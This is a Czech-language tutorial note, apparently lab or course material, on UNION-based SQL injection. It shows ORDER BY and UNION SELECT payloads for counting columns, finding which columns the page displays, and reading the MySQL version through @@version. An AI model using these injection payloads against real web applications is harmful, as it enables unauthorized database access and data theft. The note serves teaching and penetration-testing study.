## 🎯 Postup exploite při UNION-based SQLi

Po odhalení zranitelnosti (vyvoláním syntaktické chyby pomocí znaku `'`) se útok dělí na dva klíčové přípravné kroky:

1. **Zjištění celkového počtu sloupců**, které původní dotaz v databázi výběrovým příkazem načítá.
    
2. **Identifikace zobrazených pozic (Reflected Columns)** na webové stránce.
    

## 🔢 1. Krok: Detekce počtu sloupců

Pro zjištění počtu sloupců lze použít dvě metody:

### Metoda A: Pomocí `ORDER BY` (Doporučeno)

Sondou zkoušíme řadit výstup podle pořadového čísla sloupce (`ORDER BY 1`, `ORDER BY 2`...), dokud databáze nevrátí chybu nebo nepřestane zobrazovat data. **Poslední funkční číslo určuje celkový počet sloupců.**

- **Vstup:** `' ORDER BY 1-- -` _(Úspěch)_
    
- **Vstup:** `' ORDER BY 2-- -` _(Úspěch)_
    
- ...
    
- **Vstup:** `' ORDER BY 5-- -` $\rightarrow$ **Chyba / Neplatný sloupec**
    
- **Závěr:** Původní dotaz načítá **přesně 4 sloupce**.
    

### Metoda B: Pomocí `UNION SELECT`

Zkoušíme přímo injektovat dotaz `UNION SELECT` s postupně se zvyšujícím počtem výplňových hodnot (např. čísel `1, 2, 3...`), dokud nepřestane skákat chyba _column count mismatch_.

- `cn' UNION SELECT 1,2,3-- -` $\rightarrow$ _Chyba (neshoduje se počet sloupců)_
    
- `cn' UNION SELECT 1,2,3,4-- -` $\rightarrow$ **Úspěch** (Tabulka má **4 sloupce**).
    

## 📍 2. Krok: Nalezení zobrazených pozic (Reflected Columns)

Webové aplikace často nenačítají a nevykreslují všechny sloupce (např. interní ID se na strance nezobrazí). Injekci musíme umístit **pouze do těch sloupců, jejichž hodnoty se reálně vypisují do HTML kódu stránky**.

SQL

```
cn' UNION SELECT 1, 2, 3, 4-- -
```

- Pokud se na stránce zobrazí pouze čísla **`2`**, **`3`** a **`4`** (ale číslo `1` chybí), znamená to, že 1. sloupec se na front-endu nevykresluje.
    
- Svá data (payloady) musíte vkládat na pozici 2, 3 nebo 4.
    

### 🧪 Testovací Payload (Ověření funkce):

Místo výplňového čísla `2` vložíme systémovou proměnnou `@@version`:

SQL

```
cn' UNION SELECT 1, @@version, 3, 4-- -
```

**Výsledek:** Na místě čísla `2` se přímo v prohlížeči zobrazí přesná verze databázového serveru MySQL/MariaDB.